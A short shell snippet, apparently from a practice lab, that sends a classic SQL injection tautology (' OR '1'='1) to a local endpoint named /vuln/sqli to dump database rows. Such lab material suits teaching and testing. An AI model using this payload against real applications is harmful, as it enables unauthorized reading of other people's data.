# This payload tries to make the WHERE clause true and dump rows
curl -s "http://127.0.0.1:5000/vuln/sqli?q=alice' OR '1'='1" | jq

